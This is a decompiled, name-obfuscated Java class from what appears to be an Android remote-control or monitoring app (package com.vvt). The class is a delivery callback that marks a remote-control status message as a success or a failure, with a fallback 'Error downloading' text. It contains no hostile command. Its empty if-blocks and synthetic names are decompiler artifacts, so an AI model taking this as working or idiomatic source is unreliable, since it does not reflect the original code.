package com.vvt.appengine.a;

import com.vvt.ag.b;
import com.vvt.datadeliverymanager.a.a;
import com.vvt.datadeliverymanager.i;
import com.vvt.remotecontrol.output.RmtCtrlOutputStatusMessage;

class bp
  implements a
{
  bp(bo parambo) {}
  
  public void a(i parami)
  {
    boolean bool = bo.a();
    if (bool) {}
  }
  
  public void b(i parami)
  {
    boolean bool1 = bo.a();
    if (bool1) {}
    bool1 = parami.f();
    if (bool1)
    {
      localObject1 = bo.a(this.a);
      bool2 = true;
      ((RmtCtrlOutputStatusMessage)localObject1).setSuccess(bool2);
      localObject1 = bo.a(this.a);
      localObject2 = parami.e();
      ((RmtCtrlOutputStatusMessage)localObject1).setMessage((String)localObject2);
      return;
    }
    Object localObject1 = bo.a(this.a);
    boolean bool2 = false;
    Object localObject2 = null;
    ((RmtCtrlOutputStatusMessage)localObject1).setSuccess(false);
    localObject1 = parami.e();
    bool1 = b.a((String)localObject1);
    if (bool1) {}
    for (localObject1 = "Error downloading";; localObject1 = parami.e())
    {
      localObject2 = bo.a(this.a);
      ((RmtCtrlOutputStatusMessage)localObject2).setMessage((String)localObject1);
      break;
    }
  }
}


/* Location:              /Volumes/D1/codebase/android/POC/assets/product/maind/classes-enjarify.jar!/com/vvt/appengine/a/bp.class
 * Java compiler version: 5 (49.0)
 * JD-Core Version:       0.7.1
 */